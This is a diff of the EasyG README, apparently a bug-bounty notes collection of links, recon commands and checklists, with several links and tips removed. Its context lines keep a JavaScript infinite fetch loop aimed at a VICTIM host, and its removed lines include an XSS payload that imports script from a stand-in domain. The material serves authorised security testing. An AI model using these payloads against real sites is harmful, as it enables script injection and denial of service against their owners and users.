@@ -83,24 +83,15 @@ EasyG started out as a script that I use to automate some information gathering 
 
 ## Resources
 
-- [pentestbook.six2dez.com](https://pentestbook.six2dez.com/)
-- [Book of Bug Bounty Tips](https://gowsundar.gitbook.io/book-of-bugbounty-tips/)
-- [Intigriti/xss-challenges/](https://blog.intigriti.com/hackademy/xss-challenges/)
-- [Bug bounty platforms](https://github.com/disclose/bug-bounty-platforms)
-
 **Blogs**
-- [Sam Curry](https://samcurry.net/)
-  - [Hacking Apple](https://samcurry.net/hacking-apple/)
 - [Skeleton Scribe (albinowax)](https://www.skeletonscribe.net)
-- [TheXcellerator](https://xcellerator.github.io/)
-- [Securibee](https://securib.ee/beelog/)
+' [PortSwigger Research](https://portswigger.net/research)
 
 **Reports**
 - [Pentest reports](https://pentestreports.com/)
 - [Public pentesting reports](https://github.com/juliocesarfort/public-pentesting-reports)
 - [Facebook-BugBounty-Writeups](https://github.com/jaiswalakshansh/Facebook-BugBounty-Writeups)
 - [List of bug-bounty writeups](https://pentester.land/list-of-bug-bounty-writeups.html)
-- [HackerOne.com/hacktivity](https://hackerone.com/hacktivity)
 
 **News**
 - [CVE trends](https://cvetrends.com/)
@@ -123,11 +114,6 @@ EasyG started out as a script that I use to automate some information gathering 
     ```HTML
     <!-- PoC by seeu -->
     ```
-- [[Resource](https://twitter.com/Rhynorater/status/1599797037586796544)] For disabled functionalities, activate them with:
-  ```JavaScript
-  javascript:document.querySelectorAll("*[disabled]").forEach((a)=>{a.removeAttribute("disabled")})
-  ```
-
 
 
 ## Check-lists
@@ -137,14 +123,6 @@ EasyG started out as a script that I use to automate some information gathering 
 - [Regexp Security Cheatsheet](https://github.com/attackercan/regexp-security-cheatsheet)
 - [Cheat-Sheet - Active-Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
 - [Security Testing of Thick Client Application](https://medium.com/@david.valles/security-testing-of-thick-client-application-15612f326cac)
-
-### <ins>Risk markers</ins>
-- [ ] Copyright 1995
-- [ ] Server: Apache 2.2
-- [ ] Expired SSL Certificate
-- [ ] "Internal" in hostname
-- [ ] Shodan returns CVEs
-- [ ] Nuclei template matches
 
 ### <ins>Testing layers</ins>
 - [ ] Integrations
@@ -157,7 +135,6 @@ EasyG started out as a script that I use to automate some information gathering 
 ### <ins>Multiple targets</ins>
 - [ ] Run EasyG assetenum
 - [ ] Select the interesting targets
-  - See [Risk markers](#risk-markers)
   - Pass the subdomains to Burp Suite
   - Open them in Firefox
 - [ ] Check for mobile/desktop applications
@@ -225,7 +202,6 @@ EasyG started out as a script that I use to automate some information gathering 
   - `cat target.txt | hakrawler -u -insecure -t 20 -proxy http://localhost:8080 -h "Cookie: 0=1"`
 - [Katana](https://github.com/projectdiscovery/katana)
   - `katana -u target -jc -kf -aff -proxy http://127.0.0.1:8080"`
-- [xnLinkFinder](https://github.com/xnl-h4ck3r/xnLinkFinder)
 
 **Wordlists**
 - [SecLists](https://github.com/danielmiessler/SecLists)
@@ -278,7 +254,6 @@ EasyG started out as a script that I use to automate some information gathering 
 **For auths**
 - [textverified.com](https://www.textverified.com/) for auths requiring a phone number
 - [temp-mail.org](https://temp-mail.org/en/)
-- To have multiple email adresses using gmail, you can add a `+` sign after your email's alias. For example: if your email is `janedoe@gmail.com` and you sign up for Twitter you can sign up using `janedoe+twitter@gmail.com`. [[Reference](https://twitter.com/_thegameoflife_/status/1564642697482231813)]
 
 **To find parameters**
 - [Arjun](https://github.com/s0md3v/Arjun) detection of the parameters present in the application
@@ -321,7 +296,6 @@ EasyG started out as a script that I use to automate some information gathering 
   - Check for more `-t %USERPROFILE%\nuclei-templates\misconfiguration -t %USERPROFILE%\nuclei-templates\cves -t %USERPROFILE%\nuclei-templates\cnvd`
   - Use it in a workflow `cat subdomains.txt | httpx | nuclei -t technologies`
   - To use tags combined with automatic selection `nuclei -l list.txt -as -tags log4j -o output.txt`
-  - [nuclei geeknik](https://github.com/geeknik/the-nuclei-templates)
 
 
 **For Reporting**
@@ -337,8 +311,6 @@ EasyG started out as a script that I use to automate some information gathering 
 - [base64encode.org](https://www.base64encode.org/)
 - [Down or not](https://www.websiteplanet.com/webtools/down-or-not/)
 - [DigitalOcean](https://www.digitalocean.com/) See [Setting Up Your Ubuntu Box for Pentest and Bug Bounty Automation](https://www.youtube.com/watch?v=YhUiAH5SIqk)
-- [jdam - Structure-aware JSON fuzzing](https://gitlab.com/michenriksen/jdam)
-- [FuzzCoupons](https://github.com/sbrws/FuzzCoupons)
 - [Exploit Database](https://www.exploit-db.com/)
 - [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky)
 - [Flipper Zero](https://flipperzero.one/)
@@ -1114,10 +1086,6 @@ Manually testing for XXE vulnerabilities generally involves
 - This lead the page to make a loop of requests, eventually causing being blocked by a WAF and being a potential DoS
   ```JavaScript
   for(;;){fetch('https://VICTIM/',{method:'GET'});}
-  ```
-- [[Reference](https://twitter.com/zseano/status/1599118059511631872)]
-  ```HTML
-  <img src=totallyfake onerror=import(‘//domain.com/‘);//
   ```
 - Double encoding
   ```HTML
